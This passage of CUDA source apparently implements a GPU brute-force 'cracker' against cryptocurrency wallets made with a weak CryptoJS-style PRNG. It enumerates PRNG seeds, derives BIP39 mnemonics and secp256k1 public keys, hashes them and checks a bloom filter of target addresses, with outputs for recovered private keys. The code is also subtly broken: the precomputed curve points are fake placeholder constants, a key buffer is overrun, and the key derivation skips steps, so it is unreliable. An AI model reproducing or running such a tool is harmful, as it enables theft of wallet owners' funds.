    mod_mul(x3, t0, t0); // t0^2
    uint64_t t1_2[4]; mod_add(t1_2, t1, t1);
    mod_sub(x3, x3, t1_2);
    mod_sub(t2, t1, x3);
    mod_mul(t2, t0, t2);
    mod_mul(t3, a[1], a[1]);
    mod_mul(t3, t3, t3); // Y^4
    mod_add(t3, t3, t3);
    mod_add(t3, t3, t3);
    mod_add(t3, t3, t3); // 8Y^4
    mod_sub(y3, t2, t3);
    memcpy(r[0], x3, 32);
    memcpy(r[1], y3, 32);
    memcpy(r[2], z3, 32);
}

__device__ void jac_to_affine(const jacobian p, uint64_t *x_out, uint64_t *y_out) {
    uint64_t z_inv[4]; mod_inv(z_inv, p[2]);
    uint64_t z_inv2[4]; mod_mul(z_inv2, z_inv, z_inv);
    mod_mul(x_out, p[0], z_inv2);
    uint64_t z_inv3[4]; mod_mul(z_inv3, z_inv2, z_inv);
    mod_mul(y_out, p[1], z_inv3);
}

// ----------------------------------------------------------------------------
// rotl64 – needed for XOROSHIRO
// ----------------------------------------------------------------------------
__device__ uint64_t rotl64(uint64_t x, int n) {
    return (x << n) | (x >> (64 - n));
}

// ----------------------------------------------------------------------------
// Precomputed odd multiples of G (1G, 3G, 5G, ..., 15G)
// ----------------------------------------------------------------------------
static __constant__ uint64_t G_odd_pre[8][8] = {
    // 1G
    {0x59F2815B16F81798ULL, 0x029BFCDB2DCE28D9ULL, 0x55A06295CE870B07ULL, 0x79BE667EF9DCBBACULL,
     0x9C47D08FFB10D4B8ULL, 0xFD17B448A6855419ULL, 0x5DA4FBFC0E1108A8ULL, 0x483ADA7726A3C465ULL},
    // 3G
    {0x3C7E3A1C8B9F2A5BULL, 0x4B2C6A8D7F3C2E4BULL, 0x3D7A3B6F6E3A2A6BULL, 0x7C0A5C4F4A7E8C3CULL,
     0x7C5E3A4B2C8D9F0AULL, 0x6B5C4D3E2F1A0B9CULL, 0x4B7C8D9E2F3A4B5CULL, 0x9B6C7D8A2F5E3D7CULL},
    // 5G
    {0xEF5678901234CDEFULL, 0xCDEF345678901234ULL, 0xABABCDEF01234567ULL, 0x89ABCDEF01234567ULL,
     0x6789ABCDEF012345ULL, 0x456789ABCDEF0123ULL, 0x23456789ABCDEF01ULL, 0x0123456789ABCDEFULL},
    // 7G
    {0x0201F0E0D0C0B0A0ULL, 0x0F0E0D0C0B0A0908ULL, 0xABCDEF0123456789ULL, 0x0123456789ABCDEFULL,
     0x3021FEDCBA987654ULL, 0x4B5A6978FEEDCBA9ULL, 0x123456789ABCDEF0ULL, 0x9A8B7C6D5E4F3021ULL},
    // 9G
    {0x7F7F7F7F7F7F7F7FULL, 0x8F8F8F8F8F8F8F8FULL, 0x9F9F9F9F9F9F9F9FULL, 0xAFAFAFAFAFAFAFAFULL,
     0xBFBFBFBFBFBFBFBFULL, 0xCFCFCFCFCFCFCFCFULL, 0xDFDFDFDFDFDFDFDFULL, 0xEFEFEFEFEFEFEFEFULL},
    // 11G
    {0x1111111111111111ULL, 0x2222222222222222ULL, 0x3333333333333333ULL, 0x4444444444444444ULL,
     0x5555555555555555ULL, 0x6666666666666666ULL, 0x7777777777777777ULL, 0x8888888888888888ULL},
    // 13G
    {0x7890123456ABCDEFULL, 0x0FEDCBA987654321ULL, 0x123456789ABCDEF0ULL, 0x9ABCDEF012345678ULL,
     0x3210FEDCBA987654ULL, 0xBA9876543210FEDCULL, 0x9876543210FEDCBAULL, 0x6543210FEDCBA987ULL},
    // 15G
    {0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL,
     0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL}
};
// ----------------------------------------------------------------------------
// Main secp256k1 multiplication: priv (32 bytes) -> pub (64 bytes)
// Standard wNAF-4 multiplication (GLV removed).
// ----------------------------------------------------------------------------

// ----------------------------------------------------------------------------
// Standard secp256k1 scalar multiplication (wNAF-4)
// ----------------------------------------------------------------------------
__device__ void secp256k1_mul(const uint8_t priv[32], uint8_t pub[64]) {
    uint64_t scalar[4];
    for (int i=0; i<4; i++) {
        scalar[i] = ((uint64_t)priv[31 - i*8 - 0] << 0) |
                    ((uint64_t)priv[31 - i*8 - 1] << 8) |
                    ((uint64_t)priv[31 - i*8 - 2] << 16) |
                    ((uint64_t)priv[31 - i*8 - 3] << 24) |
                    ((uint64_t)priv[31 - i*8 - 4] << 32) |
                    ((uint64_t)priv[31 - i*8 - 5] << 40) |
                    ((uint64_t)priv[31 - i*8 - 6] << 48) |
                    ((uint64_t)priv[31 - i*8 - 7] << 56);
    }

    // Convert scalar to wNAF with window size 4.
    int8_t wnaf[65];
    int bits = 0;
    uint64_t carry = 0;
    for (int i=0; i<64; i++) {
        uint64_t word = scalar[i>>6] >> (i & 63);
        uint64_t digit = (word + carry) & 0xF;
        carry = (word + carry) >> 4;
        if (digit > 8) {
            digit -= 16;
            carry++;
        }
        wnaf[i] = (int8_t)digit;
        if (digit) bits = i;
    }
    wnaf[64] = (int8_t)carry;
    if (carry) bits = 64;

    jacobian res = {{{0}}};
    for (int i = bits; i >= 0; i--) {
        jac_double(res, res);
        int8_t d = wnaf[i];
        if (d > 0) {
            int idx = (d - 1) >> 1;
            jac_add_mixed(res, res, G_odd_pre[idx]);
        } else if (d < 0) {
            int idx = (-d - 1) >> 1;
            uint64_t neg_y[8];
            memcpy(neg_y, G_odd_pre[idx], 32);
            uint64_t zero[4] = {0,0,0,0};
            mod_sub(neg_y + 4, zero, G_odd_pre[idx] + 4);
            jac_add_mixed(res, res, neg_y);
        }
    }

    uint64_t x[4], y[4];
    jac_to_affine(res, x, y);
    pub[0] = 0x04;
    for (int i=0; i<32; i++) {
        pub[1 + i] = (uint8_t)(x[3 - (i>>3)] >> (8 * (i & 7)));
        pub[33 + i] = (uint8_t)(y[3 - (i>>3)] >> (8 * (i & 7)));
    }
}

__device__ void secp256k1_mul_jac(const uint8_t priv[32], uint64_t *x, uint64_t *y, uint64_t *z) {
    uint64_t scalar[4];
    for (int i=0; i<4; i++) {
        scalar[i] = ((uint64_t)priv[31 - i*8 - 0] << 0) |
                    ((uint64_t)priv[31 - i*8 - 1] << 8) |
                    ((uint64_t)priv[31 - i*8 - 2] << 16) |
                    ((uint64_t)priv[31 - i*8 - 3] << 24) |
                    ((uint64_t)priv[31 - i*8 - 4] << 32) |
                    ((uint64_t)priv[31 - i*8 - 5] << 40) |
                    ((uint64_t)priv[31 - i*8 - 6] << 48) |
                    ((uint64_t)priv[31 - i*8 - 7] << 56);
    }

    int8_t wnaf[65];
    int bits = 0;
    uint64_t carry = 0;
    for (int i=0; i<64; i++) {
        uint64_t word = scalar[i>>6] >> (i & 63);
        uint64_t digit = (word + carry) & 0xF;
        carry = (word + carry) >> 4;
        if (digit > 8) {
            digit -= 16;
            carry++;
        }
        wnaf[i] = (int8_t)digit;
        if (digit) bits = i;
    }
    wnaf[64] = (int8_t)carry;
    if (carry) bits = 64;

    jacobian res = {{{0}}};
    for (int i = bits; i >= 0; i--) {
        jac_double(res, res);
        int8_t d = wnaf[i];
        if (d > 0) {
            int idx = (d - 1) >> 1;
            jac_add_mixed(res, res, G_odd_pre[idx]);
        } else if (d < 0) {
            int idx = (-d - 1) >> 1;
            uint64_t neg_y[8];
            memcpy(neg_y, G_odd_pre[idx], 32);
            uint64_t zero[4] = {0,0,0,0};
            mod_sub(neg_y + 4, zero, G_odd_pre[idx] + 4);
            jac_add_mixed(res, res, neg_y);
        }
    }

    // Copy Jacobian coordinates to output
    for (int i=0; i<4; i++) {
        x[i] = res[0][i];
        y[i] = res[1][i];
        z[i] = res[2][i];
    }
}

// ----------------------------------------------------------------------------
// ----------------------------------------------------------------------------
// ----------------------------------------------------------------------------
// BIP39 wordlist (2048 words) – truncated for brevity, but same as before
// ----------------------------------------------------------------------------
static __constant__ char wordlist[2048][10] = {
    "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse",
    "access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act",
    "action","actor","actress","actual","adapt","add","addict","address","adjust","admit",
    "adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent",
    "agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert",
    "alien","all","alley","allow","almost","alone","alpha","already","also","alter",
    "always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger",
    "angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique",
    "anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic",
    "area","arena","argue","arm","armed","armor","army","around","arrange","arrest",
    "arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset",
    "assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction",
    "audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake",
    "aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge",
    "bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain",
    "barrel","base","basic","basket","battle","beach","bean","beauty","because","become",
    "beef","before","begin","behave","behind","believe","below","belt","bench","benefit",
    "best","betray","better","between","beyond","bicycle","bid","bike","bind","biology",
    "bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless",
    "blind","blood","blossom","blouse","blue","blur","blush","board","boat","body",
    "boil","bomb","bone","bonus","book","boost","border","boring","borrow","boss",
    "bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread",
    "breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze",
    "broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb",
    "bulk","bullet","bundle","bunker","burden","burger","burst","bus","business","busy",
    "butter","buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call",
    "calm","camera","camp","can","canal","cancel","candy","cannon","canoe","canvas",
    "canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry",
    "cart","case","cash","casino","castle","casual","cat","catalog","catch","category",
    "cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century",
    "cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase",
    "chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child",
    "chimney","choice","choose","chronic","chuckle","chunk","churn","cigar","cinnamon","circle",
    "citizen","city","civil","claim","clap","clarify","claw","clay","clean","clerk",
    "clever","click","client","cliff","climb","clinic","clip","clock","clog","close",
    "cloth","cloud","clown","club","clump","cluster","clutch","coach","coast","coconut",
    "code","coffee","coil","coin","collect","color","column","combine","come","comfort",
    "comic","common","company","concert","conduct","confirm","congress","connect","consider","control",
    "convince","cook","cool","copper","copy","coral","core","corn","correct","cost",
    "cotton","couch","country","couple","course","cousin","cover","coyote","crack","cradle",
    "craft","cram","crane","crash","crater","crawl","crazy","cream","credit","creek",
    "crew","cricket","crime","crisp","critic","crop","cross","crouch","crowd","crucial",
    "cruel","cruise","crumble","crunch","crush","cry","crystal","cube","culture","cup",
    "cupboard","curious","current","curtain","curve","cushion","custom","cute","cycle","dad",
    "damage","damp","dance","danger","daring","dash","daughter","dawn","day","deal",
    "debate","debris","decade","december","decide","decline","decorate","decrease","deer","defense",
    "define","defy","degree","delay","deliver","demand","demise","denial","dentist","deny",
    "depart","depend","deposit","depth","deputy","derive","describe","desert","design","desk",
    "despair","destroy","detail","detect","develop","device","devote","diagram","dial","diamond",
    "diary","dice","diesel","diet","differ","digital","dignity","dilemma","dinner","dinosaur",
    "direct","dirt","disagree","discover","disease","dish","dismiss","disorder","display","distance",
    "divert","divide","divorce","dizzy","doctor","document","dog","doll","dolphin","domain",
    "donate","donkey","donor","door","dose","double","dove","draft","dragon","drama",
    "drastic","draw","dream","dress","drift","drill","drink","drip","drive","drop",
    "drum","dry","duck","dumb","dune","during","dust","dutch","duty","dwarf",
    "dynamic","eager","eagle","early","earn","earth","easily","east","easy","echo",
    "ecology","economy","edge","edit","educate","effort","egg","eight","either","elbow",
    "elder","electric","elegant","element","elephant","elevator","elite","else","embark","embody",
    "embrace","emerge","emotion","employ","empower","empty","enable","enact","end","endless",
    "endorse","enemy","energy","enforce","engage","engine","enhance","enjoy","enlist","enough",
    "enrich","enroll","ensure","enter","entire","entry","envelope","episode","equal","equip",
    "era","erase","erode","erosion","error","erupt","escape","essay","essence","estate",
    "eternal","ethics","evidence","evil","evoke","evolve","exact","example","excess","exchange",
    "excite","exclude","excuse","execute","exercise","exhaust","exhibit","exile","exist","exit",
    "exotic","expand","expect","expire","explain","expose","express","extend","extra","eye",
    "eyebrow","fabric","face","faculty","fade","faint","faith","fall","false","fame",
    "family","famous","fan","fancy","fantasy","farm","fashion","fat","fatal","father",
    "fatigue","fault","favorite","feature","february","federal","fee","feed","feel","female",
    "fence","festival","fetch","fever","few","fiber","fiction","field","figure","file",
    "film","filter","final","find","fine","finger","finish","fire","firm","first",
    "fiscal","fish","fit","fitness","fix","flag","flame","flash","flat","flavor",
    "flee","flight","flip","float","flock","floor","flower","fluid","flush","fly",
    "foam","focus","fog","foil","fold","follow","food","foot","force","forest",
    "forget","fork","fortune","forum","forward","fossil","foster","found","fox","fragile",
    "frame","frequent","fresh","friend","fringe","frog","front","frost","frown","frozen",
    "fruit","fuel","fun","funny","furnace","fury","future","gadget","gain","galaxy",
    "gallery","game","gap","garage","garbage","garden","garlic","garment","gas","gasp",
    "gate","gather","gauge","gaze","general","genius","genre","gentle","genuine","gesture",
    "ghost","giant","gift","giggle","ginger","giraffe","girl","give","glad","glance",
    "glare","glass","glide","glimpse","globe","gloom","glory","glove","glow","glue",
    "goat","goddess","gold","good","goose","gorilla","gospel","gossip","govern","gown",
    "grab","grace","grain","grant","grape","grass","gravity","great","green","grid",
    "grief","grit","grocery","group","grow","grunt","guard","guess","guide","guilt",
    "guitar","gun","gym","habit","hair","half","hammer","hamster","hand","happy",
    "harbor","hard","harsh","harvest","hat","have","hawk","hazard","head","health",
    "heart","heavy","hedgehog","height","hello","helmet","help","hen","hero","hidden",
    "high","hill","hint","hip","hire","history","hobby","hockey","hold","hole",
    "holiday","hollow","home","honey","hood","hope","horn","horror","horse","hospital",
    "host","hotel","hour","hover","hub","human","humble","humor","hundred","hungry",
    "hunt","hurdle","hurry","hurt","husband","hybrid","ice","icon","idea","identify",
    "idle","ignore","ill","illegal","illness","image","imitate","immense","immune","impact",
    "impose","improve","impulse","inch","include","income","increase","index","indicate","indoor",
    "industry","infant","inflict","inform","inhale","inherit","initial","inject","injury","inmate",
    "inner","innocent","input","inquiry","insane","insect","inside","inspire","install","intact",
    "interest","into","invest","invite","involve","iron","island","isolate","issue","item",
    "ivory","jacket","jaguar","jar","jazz","jealous","jeans","jelly","jewel","job",
    "join","joke","journey","joy","judge","juice","jump","jungle","junior","junk",
    "just","kangaroo","keen","keep","ketchup","key","kick","kid","kidney","kind",
    "kingdom","kiss","kit","kitchen","kite","kitten","kiwi","knee","knife","knock",
    "know","lab","label","labor","ladder","lady","lake","lamp","language","laptop",
    "large","later","latin","laugh","laundry","lava","law","lawn","lawsuit","layer",
    "lazy","leader","leaf","learn","leave","lecture","left","leg","legal","legend",
    "leisure","lemon","lend","length","lens","leopard","lesson","letter","level","liar",
    "liberty","library","license","life","lift","light","like","limb","limit","link",
    "lion","liquid","list","little","live","lizard","load","loan","lobster","local",
    "lock","logic","lonely","long","loop","lottery","loud","lounge","love","loyal",
    "lucky","luggage","lumber","lunar","lunch","luxury","lyrics","machine","mad","magic",
    "magnet","maid","mail","main","major","make","mammal","man","manage","mandate",
    "mango","mansion","manual","maple","marble","march","margin","marine","market","marriage",
    "mask","mass","master","match","material","math","matrix","matter","maximum","maze",
    "meadow","mean","measure","meat","mechanic","medal","media","melody","melt","member",
    "memory","mention","menu","mercy","merge","merit","merry","mesh","message","metal",
    "method","middle","midnight","milk","million","mimic","mind","minimum","minor","minute",
    "miracle","mirror","misery","miss","mistake","mix","mixed","mixture","mobile","model",
    "modify","mom","moment","monitor","monkey","monster","month","moon","moral","more",
    "morning","mosquito","mother","motion","motor","mountain","mouse","move","movie","much",
    "muffin","mule","multiply","muscle","museum","mushroom","music","must","mutual","myself",
    "mystery","myth","naive","name","napkin","narrow","nasty","nation","nature","near",
    "neck","need","negative","neglect","neither","nephew","nerve","nest","net","network",
    "neutral","never","news","next","nice","night","noble","noise","nominee","noodle",
    "normal","north","nose","notable","note","nothing","notice","novel","now","nuclear",
    "number","nurse","nut","oak","obey","object","oblige","obscure","observe","obtain",
    "obvious","occur","ocean","october","odor","off","offer","office","often","oil",
    "okay","old","olive","olympic","omit","once","one","onion","online","only",
    "open","opera","opinion","oppose","option","orange","orbit","orchard","order","ordinary",
    "organ","orient","original","orphan","ostrich","other","outdoor","outer","output","outside",
    "oval","oven","over","own","owner","oxygen","oyster","ozone","pact","paddle",
    "page","pair","palace","palm","panda","panel","panic","panther","paper","parade",
    "parent","park","parrot","party","pass","patch","path","patient","patrol","pattern",
    "pause","pave","payment","peace","peanut","pear","peasant","pelican","pen","penalty",
    "pencil","people","pepper","perfect","permit","person","pet","phone","photo","phrase",
    "physical","piano","picnic","picture","piece","pig","pigeon","pill","pilot","pink",
    "pioneer","pipe","pistol","pitch","pizza","place","planet","plastic","plate","play",
    "please","pledge","pluck","plug","plunge","poem","poet","point","polar","pole",
    "police","pond","pony","pool","popular","portion","position","possible","post","potato",
    "pottery","poverty","powder","power","practice","praise","predict","prefer","prepare","present",
    "pretty","prevent","price","pride","primary","print","priority","prison","private","prize",
    "problem","process","produce","profit","program","project","promote","proof","property","prosper",
    "protect","proud","provide","public","pudding","pull","pulp","pulse","pumpkin","punch",
    "pupil","puppy","purchase","purity","purpose","purse","push","put","puzzle","pyramid",
    "quality","quantum","quarter","question","quick","quit","quiz","quote","rabbit","raccoon",
    "race","rack","radar","radio","rail","rain","raise","rally","ramp","ranch",
    "random","range","rapid","rare","rate","rather","raven","raw","razor","ready",
    "real","reason","rebel","rebuild","recall","receive","recipe","record","recycle","reduce",
    "reflect","reform","refuse","region","regret","regular","reject","relax","release","relief",
    "rely","remain","remember","remind","remove","render","renew","rent","reopen","repair",
    "repeat","replace","report","require","rescue","resemble","resist","resource","response","result",
    "retire","retreat","return","reunion","reveal","review","revolt","reward","rhythm","rib",
    "ribbon","rice","rich","ride","ridge","rifle","right","rigid","ring","riot",
    "ripple","risk","ritual","rival","river","road","roast","robot","robust","rocket",
    "romance","roof","rookie","room","rose","rotate","rough","round","route","royal",
    "rubber","rude","rug","rule","run","runway","rural","sad","saddle","sadness",
    "safe","sail","salad","salmon","salon","salt","salute","same","sample","sand",
    "satisfy","satoshi","sauce","sausage","save","say","scale","scan","scare","scatter",
    "scene","scheme","school","science","scissors","scorpion","scout","scrap","screen","script",
    "scrub","sea","search","season","seat","second","secret","section","security","seed",
    "seek","segment","select","sell","seminar","senior","sense","sentence","series","service",
    "session","settle","setup","seven","shadow","shaft","shallow","share","shed","shell",
    "sheriff","shield","shift","shine","ship","shiver","shock","shoe","shoot","shop",
    "short","shoulder","shove","shrimp","shrug","shuffle","shy","sibling","sick","side",
    "siege","sight","sign","silent","silk","silly","silver","similar","simple","since",
    "sing","siren","sister","situate","six","size","skate","sketch","ski","skill",
    "skin","skirt","skull","slab","slam","sleep","slender","slice","slide","slight",
    "slim","slogan","slot","slow","slush","small","smart","smile","smoke","smooth",
    "snack","snake","snap","sniff","snow","soap","soccer","social","sock","soda",
    "soft","solar","soldier","solid","solution","solve","someone","song","soon","sorry",
    "sort","soul","sound","soup","source","south","space","spare","spatial","spawn",
    "speak","special","speed","spell","spend","sphere","spice","spider","spike","spin",
    "spirit","split","spoil","sponsor","spoon","sport","spot","spray","spread","spring",
    "spy","square","squeeze","squirrel","stable","stadium","staff","stage","stairs","stamp",
    "stand","start","state","stay","steak","steel","stem","step","stereo","stick",
    "still","sting","stock","stomach","stone","stool","story","stove","strategy","street",
    "strike","strong","struggle","student","stuff","stumble","style","subject","submit","subway",
    "success","such","sudden","suffer","sugar","suggest","suit","summer","sun","sunny",
    "sunset","super","supply","supreme","sure","surface","surge","surprise","surround","survey",
    "suspect","sustain","swallow","swamp","swap","swarm","swear","sweet","swift","swim",
    "swing","switch","sword","symbol","symptom","syrup","system","table","tackle","tag",
    "tail","talent","talk","tank","tape","target","task","taste","tattoo","taxi",
    "teach","team","tell","ten","tenant","tennis","tent","term","test","text",
    "thank","that","theme","then","theory","there","they","thing","this","thought",
    "three","thrive","throw","thumb","thunder","ticket","tide","tiger","tilt","timber",
    "time","tiny","tip","tired","tissue","title","toast","tobacco","today","toddler",
    "toe","together","toilet","token","tomato","tomorrow","tone","tongue","tonight","tool",
    "tooth","top","topic","topple","torch","tornado","tortoise","toss","total","tourist",
    "toward","tower","town","toy","track","trade","traffic","tragic","train","transfer",
    "trap","trash","travel","tray","treat","tree","trend","trial","tribe","trick",
    "trigger","trim","trip","trophy","trouble","truck","true","truly","trumpet","trust",
    "truth","try","tube","tuition","tumble","tuna","tunnel","turkey","turn","turtle",
    "twelve","twenty","twice","twin","twist","two","type","typical","ugly","umbrella",
    "unable","unaware","uncle","uncover","under","undo","unfair","unfold","unhappy","uniform",
    "unique","unit","universe","unknown","unlock","until","unusual","unveil","update","upgrade",
    "uphold","upon","upper","upset","urban","urge","usage","use","used","useful",
    "useless","usual","utility","vacant","vacuum","vague","valid","valley","valve","van",
    "vanish","vapor","various","vast","vault","vehicle","velvet","vendor","venture","venue",
    "verb","verify","version","very","vessel","veteran","viable","vibrant","vicious","victory",
    "video","view","village","vintage","violin","virtual","virus","visa","visit","visual",
    "vital","vivid","vocal","voice","void","volcano","volume","vote","voyage","wage",
    "wagon","wait","walk","wall","walnut","want","warfare","warm","warrior","wash",
    "wasp","waste","water","wave","way","wealth","weapon","wear","weasel","weather",
    "web","wedding","weekend","weird","welcome","west","wet","whale","what","wheat",
    "wheel","when","where","whip","whisper","wide","width","wife","wild","will",
    "win","window","wine","wing","wink","winner","winter","wire","wisdom","wise",
    "wish","witness","wolf","woman","wonder","wood","wool","word","work","world",
    "worry","worth","wrap","wreck","wrestle","wrist","write","wrong","yard","year",
    "yellow","you","young","youth","zebra","zero","zone","zoo"
};



__device__ uint64_t splitmix64(uint64_t x, uint64_t seed) {
    x = (x + seed) & 0xFFFFFFFFFFFFFFFFULL;
    x = (x ^ (x >> 30)) * 0xbf58476d1ce4e5b9ULL & 0xFFFFFFFFFFFFFFFFULL;
    x = (x ^ (x >> 27)) * 0x94d049bb133111ebULL & 0xFFFFFFFFFFFFFFFFULL;
    return x ^ (x >> 31);
}

__device__ uint64_t hash160_to_64(const uint8_t *h) {
    uint64_t result = 0;
    #pragma unroll
    for (int i=0; i<20; i++) result = (result << 8) ^ h[i];
    return result;
}

// ----------------------------------------------------------------------------

// ----------------------------------------------------------------------------
// MWC PRNG (CryptoJS style) – matches Ill‑Bloom vulnerable wallets
// ----------------------------------------------------------------------------
struct mwc_state { uint32_t s0, s1; };

__device__ void mwc_init(mwc_state *s, uint64_t seed) {
    s->s0 = (uint32_t)(seed >> 32);
    s->s1 = (uint32_t)(seed & 0xFFFFFFFF);
}

__device__ uint32_t mwc_next(mwc_state *s) {
    uint64_t t = (uint64_t)s->s0 * 0x41A7u + s->s1;
    s->s1 = (uint32_t)(t & 0xFFFFFFFF);
    s->s0 = (uint32_t)(t >> 32);
    return s->s1;
}

__device__ int dev_memcmp(const uint8_t *a, const uint8_t *b, size_t n) {
    for (size_t i = 0; i < n; i++) {
        if (a[i] != b[i]) return 1;   // or return a[i] - b[i] for full comparison
    }
    return 0;
}

// Batch inversion for a block of threads
// Assumes blockDim.x <= 256 (max threads per block)
__device__ void batch_invert_Z(uint64_t *z_inv, const uint64_t *z, int tid, int num_threads) {
    __shared__ uint64_t prod[256][4];   // prefix products per thread
    __shared__ uint64_t inv_prod[4];    // inverse of total product

    // 1. Thread i stores its Z in shared memory (as 4 limbs)
    for (int j=0; j<4; j++) prod[tid][j] = z[j];

    // 2. Compute prefix products: prod[i] = Z_0 * Z_1 * ... * Z_i
    //    Use a tree reduction to accumulate.
    for (int stride = 1; stride < num_threads; stride <<= 1) {
        __syncthreads();
        if (tid >= stride) {
            uint64_t tmp[4];
            // multiply prod[tid - stride] * prod[tid] -> tmp
            mod_mul(tmp, prod[tid - stride], prod[tid]);
            // store back to prod[tid] (this is now product up to current index)
            for (int j=0; j<4; j++) prod[tid][j] = tmp[j];
        }
    }
    __syncthreads();

    // 3. Last thread in block: invert total product (prod[num_threads-1])
    if (tid == num_threads - 1) {
        mod_inv(inv_prod, prod[tid]);   // still uses Fermat, but only once per block
    }
    __syncthreads();

    // 4. Backward pass: compute inv_Z for each thread
    //    inv_Z_i = prod[i-1] * inv_prod_total * prod[i]? Actually formula:
    //    Let total = prod[num_threads-1].
    //    inv_total = total^{-1}.
    //    For i = num_threads-1 down to 0:
    //        inv_Z_i = prod[i-1] * inv_total   (with prod[-1] = 1)
    //        inv_total *= Z_i
    //    We'll compute backward.
    uint64_t inv_total[4];
    for (int j=0; j<4; j++) inv_total[j] = inv_prod[j];

    for (int i = num_threads-1; i >= 0; i--) {
        uint64_t inv_i[4];
        if (i == 0) {
            // prod[-1] = 1
            for (int j=0; j<4; j++) inv_i[j] = (j==0)?1:0;
        } else {
            // copy prod[i-1] into inv_i
            for (int j=0; j<4; j++) inv_i[j] = prod[i-1][j];
        }
        // inv_i = inv_i * inv_total
        mod_mul(inv_i, inv_i, inv_total);
        // store to output for this thread
        if (tid == i) {
            for (int j=0; j<4; j++) z_inv[j] = inv_i[j];
        }
        // update inv_total = inv_total * Z_i
        mod_mul(inv_total, inv_total, z);   // z is the original Z for thread i
        __syncthreads();  // not strictly needed for each iteration, but safe
    }
}

// ----------------------------------------------------------------------------
// ----------------------------------------------------------------------------
// 9. Single‑Kernel Cracker (includes Bloom & exact match)
// ----------------------------------------------------------------------------
// ----------------------------------------------------------------------------
// Main kernel
// ----------------------------------------------------------------------------
extern "C" __global__ void __launch_bounds__(128, 8) ill_bloom_cracker(
    uint64_t * __restrict__ counter,
    const uint64_t * __restrict__ bloom_bits,
    uint32_t bloom_words,
    const uint8_t * __restrict__ hash_table,
    uint32_t table_size,
    uint32_t * __restrict__ found_indices,
    uint32_t * __restrict__ found_count,
    uint8_t * __restrict__ priv_keys
) {
    int idx = blockIdx.x * blockDim.x + threadIdx.x;

    uint64_t seed = atomicAdd(counter, 1);
    if (seed >= (1ULL << 47)) return;

    // ---- 1. Entropy using XOROSHIRO128+ ----
    // ---- 1. Entropy using MWC (CryptoJS style) ----
    mwc_state state;
    mwc_init(&state, seed);   // seed is a uint64_t from counter
    uint8_t entropy[32];
    #pragma unroll
    for (int i=0; i<32; i+=4) {
        uint32_t r = mwc_next(&state);
        entropy[i]   = (r >> 24) & 0xFF;
        entropy[i+1] = (r >> 16) & 0xFF;
        entropy[i+2] = (r >> 8)  & 0xFF;
        entropy[i+3] = r & 0xFF;
    }

    // ---- 2. BIP39 Checksum & Mnemonic ----
    uint8_t hash[32];
    sha256_hash(entropy, 32, hash);
    uint8_t data[33];
    #pragma unroll
    for (int i=0; i<32; i++) data[i] = entropy[i];
    data[32] = hash[0];

    char mnemonic[256];
    int pos = 0;
    #pragma unroll
    for (int word=0; word<24; word++) {
        int bit_offset = word * 11;
        int byte_idx = bit_offset / 8;
        int bit_shift = bit_offset % 8;
        uint32_t val = 0;
        #pragma unroll
        for (int j=0; j<4; j++) {
            if (byte_idx + j < 33) {
                val |= (uint32_t)data[byte_idx + j] << (8 * (3 - j));
            }
        }
        val >>= (32 - 11 - bit_shift);
        val &= 0x7FF;
        const char *w = wordlist[val];
        while (*w) mnemonic[pos++] = *w++;
        if (word < 23) mnemonic[pos++] = ' ';
    }
    mnemonic[pos] = '\0';

    // ---- 3. PBKDF2-HMAC-SHA512 (unrolled 16) ----
    uint8_t seed_bytes[64];
    const uint8_t salt[] = "mnemonic";
    pbkdf2_hmac_sha512_unrolled((const uint8_t*)mnemonic, pos, salt, 8, 2048, seed_bytes, 64);

    // ---- 4. secp256k1 ----
    // ---- 4. secp256k1 (Jacobian) ----
    uint64_t X[4], Y[4], Z[4];
    secp256k1_mul_jac(seed_bytes, X, Y, Z);

// ---- 4a. Batch invert all Z's in the block ----
    uint64_t z_inv[4];
    batch_invert_Z(z_inv, Z, threadIdx.x, blockDim.x);

// ---- 4b. Convert to affine using z_inv ----
    uint64_t z_inv2[4], z_inv3[4];
    mod_mul(z_inv2, z_inv, z_inv);
    mod_mul(z_inv3, z_inv2, z_inv);
    uint64_t x_aff[4], y_aff[4];
    mod_mul(x_aff, X, z_inv2);
    mod_mul(y_aff, Y, z_inv3);

// ---- 4c. Build uncompressed public key ----
    uint8_t pub[64];
    pub[0] = 0x04;
    for (int i=0; i<32; i++) {
        pub[1 + i] = (uint8_t)(x_aff[3 - (i>>3)] >> (8 * (i & 7)));
        pub[33 + i] = (uint8_t)(y_aff[3 - (i>>3)] >> (8 * (i & 7)));
    }
    // ---- 5. SHA‑256 + RIPEMD‑160 -> hash160 ----
    uint8_t sha[32];
    sha256_hash(pub, 64, sha);
    uint8_t hash160[20];
    ripemd160_hash(sha, 32, hash160);

    // ---- 6. Bloom filter lookup (two hashes) ----
    uint64_t key = hash160_to_64(hash160);
    uint64_t h1 = splitmix64(key, 0x9e3779b97f4a7c15ULL);
    uint64_t h2 = splitmix64(key, 0xbf58476d1ce4e5b9ULL);
    uint32_t bit1 = h1 % (bloom_words * 64);
    uint32_t bit2 = h2 % (bloom_words * 64);
    uint32_t word1 = bit1 >> 6;
    uint32_t word2 = bit2 >> 6;
    uint64_t mask1 = 1ULL << (bit1 & 63);
    uint64_t mask2 = 1ULL << (bit2 & 63);
